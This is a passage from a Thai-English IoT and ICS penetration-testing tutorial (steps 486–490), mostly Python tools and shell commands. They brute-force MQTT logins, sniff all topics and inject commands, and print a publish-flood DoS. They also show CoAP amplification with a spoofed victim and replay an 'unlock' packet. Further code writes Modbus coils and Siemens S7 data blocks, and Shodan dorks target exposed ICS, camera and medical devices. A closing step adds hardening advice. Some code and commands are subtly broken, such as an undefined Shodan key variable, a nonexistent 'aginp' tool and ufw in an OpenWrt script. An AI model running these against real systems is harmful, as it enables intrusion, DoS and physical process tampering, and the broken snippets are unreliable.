        print("\n[*] Testing MQTT credentials...")
        
        for username, password in credentials:
            try:
                client = mqtt.Client()
                client.username_pw_set(username, password)
                result = client.connect(self.broker, self.port, 30)
                
                if result == 0:
                    print(f"[+] VALID CREDENTIALS: {username}:{password}")
                    client.disconnect()
                    return {'username': username, 'password': password}
                
                client.disconnect()
            except Exception as e:
                pass
        
        return {}
    
    def subscribe_all_topics(self, duration: int = 30):
        """Subscribe to all topics และดักจับ messages"""
        print(f"\n[*] Subscribing to all topics for {duration}s...")
        captured = []
        
        def on_message(client, userdata, msg):
            message = {
                'topic': msg.topic,
                'payload': msg.payload.decode('utf-8', errors='ignore'),
                'qos': msg.qos,
                'retain': msg.retain,
                'time': time.strftime('%H:%M:%S')
            }
            captured.append(message)
            print(f"[+] Message: [{msg.topic}] {message['payload'][:80]}")
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                print(f"[+] Connected! Subscribing to all topics...")
                client.subscribe('#')  # Wildcard
                client.subscribe('$SYS/#')  # System topics
        
        client = mqtt.Client()
        client.on_connect = on_connect
        client.on_message = on_message
        
        try:
            client.connect(self.broker, self.port)
            client.loop_start()
            time.sleep(duration)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return captured
    
    def inject_command(self, topic: str, payload: str):
        """Inject command via MQTT"""
        print(f"\n[*] Injecting to topic: {topic}")
        print(f"[*] Payload: {payload}")
        
        try:
            client = mqtt.Client()
            client.connect(self.broker, self.port)
            
            result = client.publish(topic, payload, qos=1)
            result.wait_for_publish()
            
            if result.is_published():
                print(f"[+] Message published successfully")
            
            client.disconnect()
        except Exception as e:
            print(f"[-] Publish failed: {e}")
    
    def discover_topics_via_sys(self):
        """ค้นหา topics ผ่าน $SYS topics"""
        print("\n[*] Querying broker system info via $SYS...")
        
        sys_topics = [
            '$SYS/broker/version',
            '$SYS/broker/clients/connected',
            '$SYS/broker/subscriptions/count',
            '$SYS/broker/messages/received',
            '$SYS/broker/log/M/subscribe',
        ]
        
        captured = []
        
        def on_message(client, userdata, msg):
            captured.append({'topic': msg.topic, 'value': msg.payload.decode()})
            print(f"[+] {msg.topic}: {msg.payload.decode()}")
        
        client = mqtt.Client()
        client.on_message = on_message
        
        try:
            client.connect(self.broker, self.port)
            for topic in sys_topics:
                client.subscribe(topic)
            client.loop_start()
            time.sleep(5)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return captured
    
    def test_access_control(self):
        """Test topic ACL misconfiguration"""
        print("\n[*] Testing topic ACL...")
        
        # ตรวจสอบว่า publish ไปยัง topics สำคัญได้ไหม
        admin_topics = [
            'admin/command',
            'device/firmware/update',
            'config/update',
            'alarm/disable',
        ]
        
        for topic in admin_topics:
            try:
                client = mqtt.Client()
                client.connect(self.broker, self.port)
                result = client.publish(topic, 'test_payload', qos=1)
                result.wait_for_publish()
                
                if result.is_published():
                    print(f"[!] CAN PUBLISH TO: {topic} (ACL misconfigured?)")
                
                client.disconnect()
            except:
                pass
    
    def dos_attack(self, topic: str = '#', msg_count: int = 10000):
        """Test DoS resistance"""
        print(f"\n[*] DoS test: Sending {msg_count} messages")
        
        dos_script = f"""
# bash DoS test
for i in $(seq 1 {msg_count}); do
    mosquitto_pub \\
        -h {self.broker} \\
        -t '{topic}' \\
        -m 'dos_test_$i'
done
"""
        print(dos_script)

if __name__ == '__main__':
    tester = MQTTSecurityTester('192.168.1.100')
    
    # ทดสอบ anonymous access
    is_anon = tester.test_anonymous_access()
    
    if is_anon:
        # ดักจับ messages
        messages = tester.subscribe_all_topics(duration=30)
        
        # Inject test command
        tester.inject_command('device/command', '{"action": "restart"}')
        
        # Check system info
        tester.discover_topics_via_sys()
```

---

## Step 487: CoAP Protocol Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ CoAP (Constrained Application Protocol)

```python
#!/usr/bin/env python3
# CoAP Protocol Security Testing

import asyncio
aiocoap_example = """
import aiocoap
import aiocoap.resource
"""

COAP_SECURITY_ISSUES = [
    'No authentication by default',
    'UDP-based (amplification attacks)',
    'DTLS optional not mandatory',
    'Resource discovery leaks info (/.well-known/core)',
    'Replay attacks on confirmable messages',
]

class CoAPSecurityTester:
    """CoAP protocol security testing"""
    
    def discover_resources(self, target: str, port: int = 5683):
        """Discover CoAP resources"""
        discovery_cmds = f"""
# ติดตั้ง coap tools
pip install aiocoap
apt-get install coap-client -y

# Resource discovery
coap-client -m get coap://{target}:{port}/.well-known/core

# หรือใช้ nmap
nmap -sU -p {port} --script coap-resources {target}

# Manual GET request
coap-client -m get coap://{target}:{port}/

# POST to actuator
coap-client -m post -e '{{"value":1}}' coap://{target}:{port}/led
"""
        print(discovery_cmds)
    
    def test_coap_amplification(self, target: str, reflector: str):
        """Test CoAP amplification attack"""
        amp_test = f"""
# CoAP Amplification:
# ส่ง small GET request แต่ได้ large response
# Amplification factor up to 50x

# ส่ง spoofed source IP request
python3 coap_amplify.py \\
    --reflector {reflector} \\
    --victim {target} \\
    --path /.well-known/core

# ตรวจสอบ Amplification Factor
# GET request: ~50 bytes
# Response (.well-known/core): up to 2500 bytes
# Amplification: ~50x
"""
        print(amp_test)
    
    def test_without_dtls(self, target: str, port: int = 5683):
        """Test if CoAP runs without DTLS"""
        test_cmd = f"""
# ตรวจสอบ plain CoAP (no DTLS)
coap-client -m get coap://{target}:{port}/.well-known/core

# DTLS port มักจะเป็น 5684
coap-client -m get coaps://{target}:5684/.well-known/core

# ถ้า plain CoAP port เปิด = ข้อมูลถูกส่ง unencrypted
"""
        print(test_cmd)
    
    def replay_coap_request(self, captured_request: bytes):
        """Replay captured CoAP request"""
        replay_cmd = """
# Capture CoAP traffic
wireshark -i eth0 -k -f 'udp port 5683'

# Replay ผ่าน scapy
from scapy.all import *
from scapy.contrib.coap import *

# Rebuild CoAP packet
pkt = IP(dst='192.168.1.100')/UDP(dport=5683)/CoAP(
    type=0,  # CON
    code=3,  # PUT
    msg_id=0x1234
)/b'{"action":"unlock"}'

send(pkt)
"""
        print(replay_cmd)

if __name__ == '__main__':
    tester = CoAPSecurityTester()
    tester.discover_resources('192.168.1.100')
    tester.test_coap_amplification('victim_ip', '192.168.1.100')
    tester.test_without_dtls('192.168.1.100')
```

---

## Step 488: Industrial IoT (ICS/SCADA) Security

### อธิบาย
การทดสอบความปลอดภัยของระบบ ICS/SCADA ครอบคลุม Modbus, DNP3 และ S7 protocols

```python
#!/usr/bin/env python3
# ICS/SCADA Security Testing Framework

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import socket
import struct

ICS_PROTOCOLS = {
    'modbus': {'port': 502, 'description': 'Industrial automation protocol'},
    'dnp3': {'port': 20000, 'description': 'Electric utility automation'},
    's7comm': {'port': 102, 'description': 'Siemens SIMATIC S7 PLCs'},
    'bacnet': {'port': 47808, 'description': 'Building automation (UDP)'},
    'ethernetip': {'port': 44818, 'description': 'Rockwell industrial protocol'},
    'profinet': {'port': 34962, 'description': 'Profibus over Ethernet'},
    'iec61850': {'port': 102, 'description': 'Power substation automation'},
}

class ICSSecurityTester:
    """ICS/SCADA security assessment"""
    
    def scan_ics_protocols(self, target: str) -> list:
        """Scan for ICS protocols"""
        print(f"[*] Scanning ICS protocols on {target}")
        found = []
        
        for protocol, info in ICS_PROTOCOLS.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, info['port']))
                sock.close()
                
                if result == 0:
                    found.append({'protocol': protocol, 'port': info['port']})
                    print(f"[+] Found {protocol} on port {info['port']}")
            except:
                pass
        
        return found
    
    def test_modbus_unauthenticated(self, target: str, port: int = 502):
        """Test Modbus without authentication"""
        print(f"\n[*] Testing Modbus on {target}:{port}")
        
        try:
            client = ModbusTcpClient(host=target, port=port)
            
            if client.connect():
                print("[+] Connected to Modbus (no auth!)")
                
                # Read holding registers
                result = client.read_holding_registers(address=0, count=10, slave=1)
                if not result.isError():
                    print(f"[+] Holding Registers: {result.registers}")
                
                # Read coils (digital outputs)
                coils = client.read_coils(address=0, count=10, slave=1)
                if not coils.isError():
                    print(f"[+] Coils (outputs): {coils.bits[:10]}")
                
                # Write coil (control output)
                write_result = client.write_coil(address=0, value=True, slave=1)
                if not write_result.isError():
                    print(f"[!] WROTE TO COIL 0 = TRUE (sent command!)")
                
                client.close()
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def modbus_device_scan(self, target: str):
        """Scan all Modbus addresses"""
        scan_script = f"""
# Scan Modbus device IDs (1-247)
for slave_id in range(1, 248):
    client = ModbusTcpClient('{target}')
    client.connect()
    result = client.read_device_information(slave=slave_id)
    if not result.isError():
        print(f'Found device at slave ID: {{slave_id}}')
        print(f'Vendor: {{result.information[0]}}')
        print(f'Product: {{result.information[1]}}')
    client.close()
"""
        print(scan_script)
    
    def test_s7_protocol(self, target: str, port: int = 102):
        """Test Siemens S7 protocol"""
        s7_test = f"""
# Siemens S7 Protocol Testing
# ใช้ python-snap7
pip install python-snap7

import snap7

client = snap7.client.Client()
client.connect('{target}', 0, 1)  # IP, rack, slot

# Read system info
info = client.get_cpu_info()
print(f'Module type: {{info.ModuleTypeName.decode()}}')
print(f'Serial: {{info.SerialNumber.decode()}}')

# Read data block
db_data = client.db_read(db_number=1, start=0, size=100)
print(f'DB1 data: {{db_data.hex()}}')

# Write to DB (command execution)
client.db_write(db_number=1, start=0, data=b'\\x01')  # Write value

client.disconnect()
"""
        print(s7_test)
    
    def shodan_ics_search(self):
        """Shodan dork สำหรับ ICS devices"""
        dorks = """
# Shodan dorks สำหรับ ICS/SCADA:

port:502            # Modbus
port:102            # S7/MMS
port:20000 dnp3     # DNP3
port:44818          # EtherNet/IP
product:"Siemens"   # Siemens PLCs
product:"SCADA"     # Generic SCADA
"default password"  # Unprotected

# NMAP ICS scripts
nmap -sV --script modbus-discover {target}
nmap -sV --script s7-info {target}
nmap -sV --script dnp3-info {target}
nmap -sU --script bacnet-info -p 47808 {target}
"""
        print(dorks)
    
    def generate_ics_report(self, findings: list) -> str:
        """Generate ICS security report"""
        report = """
ICS/SCADA Security Assessment Report
====================================

Critical Risks in ICS:
1. Unauthenticated Modbus access
   - Attacker can read/write to any register
   - Physical process manipulation possible

2. Direct Internet exposure
   - ICS devices should NEVER be internet-facing
   - Shodan shows thousands of exposed devices

3. Default credentials
   - Many PLCs ship with default passwords

Recommendations:
- Segment ICS network (Purdue model)
- Implement DMZ between IT and OT
- Use industrial firewalls (Claroty, Dragos)
- Deploy ICS-specific IDS
- Regular vulnerability assessments
- No direct internet connectivity
"""
        return report

if __name__ == '__main__':
    tester = ICSSecurityTester()
    
    found = tester.scan_ics_protocols('192.168.1.100')
    
    if any(p['protocol'] == 'modbus' for p in found):
        tester.test_modbus_unauthenticated('192.168.1.100')
    
    tester.shodan_ics_search()
    report = tester.generate_ics_report(found)
    print(report)
```

---

## Step 489: IoT Vulnerability Scanning with Shodan

### อธิบาย
การใช้ Shodan และ tools อื่นๆ เพื่อค้นหา IoT devices ที่มีช่องโหว่

```python
#!/usr/bin/env python3
# IoT Vulnerability Scanner using Shodan

import shodan
import json
from datetime import datetime

IOT_SHODAN_DORKS = {
    'cameras': [
        'product:"Hikvision" port:80',
        'product:"Dahua" port:80',
        'webcam has_screenshot:true',
        'title:"IP Camera" country:TH',
    ],
    'routers': [
        'default password',
        'product:"MikroTik" port:8291',
        'product:"DD-WRT" port:80',
    ],
    'industrial': [
        'port:502',  # Modbus
        'product:"Siemens" port:102',
        'port:20000',  # DNP3
    ],
    'medical': [
        'product:"DICOM" port:104',
        'product:"medical"',
    ],
    'building': [
        'port:47808',  # BACnet
        'product:"building automation"',
    ]
}

class IoTVulnScanner:
    """IoT vulnerability scanning and discovery"""
    
    def __init__(self, shodan_api_key: str = None):
        self.api_key = shodan_api_key
        self.api = shodan.Shodan(api_key) if shodan_api_key else None
    
    def search_shodan(self, query: str, limit: int = 100) -> list:
        """ค้นหา IoT devices ผ่าน Shodan"""
        print(f"[*] Shodan search: {query}")
        
        if not self.api:
            print("[*] Shodan API key not set. Manual search:")
            print(f"    https://shodan.io/search?query={query}")
            return []
        
        results = []
        try:
            search_result = self.api.search(query, limit=limit)
            print(f"[+] Found {search_result['total']} results")
            
            for match in search_result['matches'][:limit]:
                device_info = {
                    'ip': match.get('ip_str'),
                    'port': match.get('port'),
                    'org': match.get('org', 'Unknown'),
                    'country': match.get('location', {}).get('country_name', 'Unknown'),
                    'product': match.get('product', ''),
                    'data': match.get('data', '')[:200]
                }
                results.append(device_info)
                print(f"  [{device_info['country']}] {device_info['ip']}:{device_info['port']} - {device_info['org']}")
        
        except shodan.APIError as e:
            print(f"[-] API Error: {e}")
        
        return results
    
    def check_cve_vulnerabilities(self, target_ip: str):
        """Check known CVEs for IoT device"""
        cve_check_cmds = f"""
# ใช้ Shodan API ดู CVEs
shodan host {target_ip}

# ใช้ Vulners.com
curl 'https://vulners.com/api/v3/search/lucene/?query=affectedSoftware.name:hikvision'

# Nuclei สำหรับ IoT scanning
nuclei \\
    -target {target_ip} \\
    -t /usr/share/nuclei-templates/iot/ \\
    -t /usr/share/nuclei-templates/default-logins/ \\
    -o /tmp/iot_vulns.txt

# หรือใช้ Metasploit
msf6 > search type:auxiliary name:iot
msf6 > use auxiliary/scanner/http/hikvision_bypass
msf6 > set RHOSTS {target_ip}
msf6 > run
"""
        print(cve_check_cmds)
    
    def scan_iot_network(self, subnet: str = '192.168.1.0/24'):
        """Scan local network for IoT devices"""
        scan_cmd = f"""
# Nmap IoT scan
nmap -sV --script banner,http-title \\
    -p 80,443,8080,8443,23,22,102,502,1883,5683 \\
    {subnet} \\
    -oA /tmp/iot_scan

# หา UPNP devices
nmap -sU --script upnp-info -p 1900 {subnet}

# หา mDNS devices
nmap -sU --script dns-service-discovery -p 5353 {subnet}

# Angry IP Scanner (GUI option)
aginp /tmp/iot_scan_results.csv -f {subnet}

# arp-scan
arp-scan --interface=eth0 {subnet}
"""
        print(scan_cmd)
    
    def generate_iot_findings_report(self, devices: list) -> dict:
        """Generate IoT security findings report"""
        critical = [d for d in devices if d.get('vuln_level') == 'CRITICAL']
        high = [d for d in devices if d.get('vuln_level') == 'HIGH']
        
        report = {
            'date': datetime.now().strftime('%Y-%m-%d'),
            'total_devices': len(devices),
            'critical': len(critical),
            'high': len(high),
            'top_vulnerabilities': [
                'Default credentials',
                'Outdated firmware',
                'Unencrypted protocols',
                'Command injection in web interface',
                'Hardcoded credentials in firmware'
            ]
        }
        return report

if __name__ == '__main__':
    scanner = IoTVulnScanner()
    scanner.scan_iot_network('192.168.1.0/24')
    scanner.check_cve_vulnerabilities('192.168.1.1')
    
    for category, dorks in IOT_SHODAN_DORKS.items():
        print(f"\n[*] {category.upper()} dorks:")
        for dork in dorks:
            print(f"  {dork}")
```

---

## Step 490: IoT Security Hardening Framework

### อธิบาย
การสร้าง comprehensive IoT security hardening guide และ assessment framework

```python
#!/usr/bin/env python3
# IoT Security Hardening and Assessment Framework

from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict

class IoTRisk(Enum):
    CRITICAL = 5
    HIGH = 4
    MEDIUM = 3
    LOW = 2
    INFO = 1

@dataclass
class IoTSecurityCheck:
    id: str
    category: str
    description: str
    risk: IoTRisk
    test_procedure: str
    remediation: str
    result: str = 'NOT_TESTED'

IOT_SECURITY_CHECKLIST = [
    IoTSecurityCheck(
        id='IOT-01',
        category='Authentication',
        description='Default credentials not changed',
        risk=IoTRisk.CRITICAL,
        test_procedure='Test admin/admin, root/root, admin/password via web UI',
        remediation='Change all default credentials immediately'
    ),
    IoTSecurityCheck(
        id='IOT-02',
        category='Communication',
        description='Unencrypted protocol in use',
        risk=IoTRisk.HIGH,
        test_procedure='Capture traffic, check for plaintext passwords',
        remediation='Enable TLS/SSL for all communications'
    ),
    IoTSecurityCheck(
        id='IOT-03',
        category='Firmware',
        description='Outdated firmware with known vulnerabilities',
        risk=IoTRisk.HIGH,
        test_procedure='Extract firmware version, check vendor CVE database',
        remediation='Update to latest firmware version'
    ),
    IoTSecurityCheck(
        id='IOT-04',
        category='Debug',
        description='Debug interfaces exposed (UART/JTAG)',
        risk=IoTRisk.HIGH,
        test_procedure='Physical inspection for debug ports',
        remediation='Disable or secure debug interfaces in production'
    ),
    IoTSecurityCheck(
        id='IOT-05',
        category='Web Interface',
        description='Command injection in web parameters',
        risk=IoTRisk.CRITICAL,
        test_procedure='Test ping, traceroute with OS injection payloads',
        remediation='Input validation, disable CGI or sanitize inputs'
    ),
    IoTSecurityCheck(
        id='IOT-06',
        category='Network',
        description='Unnecessary services enabled',
        risk=IoTRisk.MEDIUM,
        test_procedure='Port scan: telnet, FTP, HTTP (not HTTPS)',
        remediation='Disable unnecessary services'
    ),
    IoTSecurityCheck(
        id='IOT-07',
        category='Firmware',
        description='Hardcoded credentials in firmware',
        risk=IoTRisk.CRITICAL,
        test_procedure='Extract and analyze firmware with firmwalker',
        remediation='Remove hardcoded credentials, use secure storage'
    ),
    IoTSecurityCheck(
        id='IOT-08',
        category='Update',
        description='No secure update mechanism',
        risk=IoTRisk.HIGH,
        test_procedure='Intercept update process, check for signature verification',
        remediation='Implement signed firmware updates'
    ),
]

class IoTSecurityFramework:
    """IoT security assessment and hardening framework"""
    
    def __init__(self, device_name: str):
        self.device_name = device_name
        self.checks = SECURITY_CHECKLIST.copy() if 'SECURITY_CHECKLIST' in dir() else IOT_SECURITY_CHECKLIST.copy()
        self.results = []
    
    def run_automated_checks(self, target_ip: str):
        """Run automated security checks"""
        auto_checks = f"""
# Automated IoT Security Assessment

# 1. Port scan
nmap -sV -sC \\
    -p 21,22,23,80,443,8080,1883,5683,502,102 \\
    {target_ip}

# 2. Default credential test
hydra \\
    -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt \\
    -P /usr/share/SecLists/Passwords/Common-Credentials/best1050.txt \\
    -t 4 \\
    {target_ip} http-get /

# 3. Vulnerability scan
nuclei \\
    -target {target_ip} \\
    -t /usr/share/nuclei-templates/ \\
    -severity critical,high \\
    -o /tmp/nuclei_iot_results.txt

# 4. SSL/TLS check (if HTTPS)
testssl.sh https://{target_ip}/

# 5. Directory brute force
gobuster dir \\
    -u http://{target_ip}/ \\
    -w /usr/share/SecLists/Discovery/Web-Content/IoT-default-credentials.txt
"""
        print(auto_checks)
    
    def manual_checks_guide(self) -> str:
        """Generate manual testing guide"""
        guide = f"""
Manual IoT Security Testing Guide for: {self.device_name}
{'='*60}

{chr(10).join([f"[{check.id}] {check.description}" + chr(10) + 
              f"  Risk: {check.risk.name}" + chr(10) +
              f"  Test: {check.test_procedure}" + chr(10) +
              f"  Fix: {check.remediation}" + chr(10)
              for check in self.checks])}
"""
        return guide
    
    def generate_hardening_script(self, device_os: str = 'openwrt') -> str:
        """Generate device hardening script"""
        if device_os == 'openwrt':
            hardening = """
#!/bin/sh
# OpenWrt IoT Hardening Script

# 1. Change default password
passwd root

# 2. ปิด Telnet
/etc/init.d/telnet disable
/etc/init.d/telnet stop

# 3. ปิด HTTP, ใช้ HTTPS เท่านั้น
uci set uhttpd.main.redirect_https=1

# 4. SSH hardening
cat >> /etc/ssh/sshd_config << 'EOF'
PermitRootLogin no
PasswordAuthentication no
Port 2222
EOF

# 5. Firewall rules
ufw default deny incoming
ufw allow from 192.168.1.0/24 to any port 2222

# 6. Disable WPS
iwinfo radio0 | grep WPS
uci set wireless.@wifi-iface[0].wps_disabled=1

# 7. Enable firewall logging
uci set firewall.@defaults[0].log=1

# 8. Auto-update
echo '0 3 * * * opkg update && opkg upgrade' >> /etc/crontabs/root
"""
        else:
            hardening = """
# Generic Linux IoT Hardening

# เปลี่ยน password
passwd root

# ปิด services ที่ไม่จำเป็น
systemctl disable telnet
systemctl disable ftp

# iptables hardening
iptables -P INPUT DROP
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT

# ปิด UART debug (if possible via software)
echo 'earlycon=0' >> /boot/cmdline.txt
"""
        return hardening
    
    def produce_assessment_report(self) -> dict:
        """Produce final assessment report"""
        critical_count = sum(1 for c in self.checks if c.risk == IoTRisk.CRITICAL)
        high_count = sum(1 for c in self.checks if c.risk == IoTRisk.HIGH)
        
        report = {
            'device': self.device_name,
            'date': '2024-01-01',
            'total_checks': len(self.checks),
            'critical_checks': critical_count,
            'high_checks': high_count,
            'risk_score': critical_count * 5 + high_count * 4,
            'top_findings': [
                check.description for check in self.checks 
                if check.risk in [IoTRisk.CRITICAL, IoTRisk.HIGH]
            ][:5],
            'immediate_actions': [
                'Change all default credentials',
                'Update firmware to latest version',
                'Enable encrypted communications',
                'Disable unnecessary services',
                'Implement network segmentation'
            ]
        }
        
        print(f"\n{'='*60}")
        print(f"IoT Security Assessment: {self.device_name}")
        print(f"Risk Score: {report['risk_score']}/100")
        print(f"Critical: {critical_count} | High: {high_count}")
        print('='*60)
        
        return report

if __name__ == '__main__':
    framework = IoTSecurityFramework('Hikvision IP Camera DS-2CD2143G2')
    
    framework.run_automated_checks('192.168.1.200')
    print(framework.manual_checks_guide())
    
    hardening = framework.generate_hardening_script('openwrt')
    print(f"\n[*] Hardening script:\n{hardening}")
    
    report = framework.produce_assessment_report()
    import json
    with open('/tmp/iot_assessment_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    print(f"[+] Report saved to /tmp/iot_assessment_report.json")
```

---

## สรุป Part 49

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 481 | UART/Serial Exploitation | screen, minicom, python-serial |
| 482 | JTAG/SWD Debug Interface | OpenOCD, J-Link, GDB |
| 483 | Firmware Extraction | binwalk, firmwalker, QEMU |
| 484 | IoT Web Interface Testing | gobuster, nuclei, hydra |
| 485 | SPI Flash Extraction | flashrom, CH341A, Bus Pirate |
| 486 | MQTT Security Testing | paho-mqtt, mosquitto tools |
| 487 | CoAP Protocol Testing | aiocoap, coap-client |
| 488 | ICS/SCADA Security | pymodbus, snap7, Metasploit |
| 489 | IoT Vulnerability Scanning | Shodan, nuclei, nmap NSE |
| 490 | IoT Hardening Framework | Assessment checklist, hardening scripts |

**Key Security Issues:**
- UART/JTAG debug interfaces left enabled in production
- Default credentials on web interfaces
- Cleartext protocols (MQTT, CoAP without TLS)
- Hardcoded credentials in firmware
- Unauthenticated Modbus/S7 ICS access
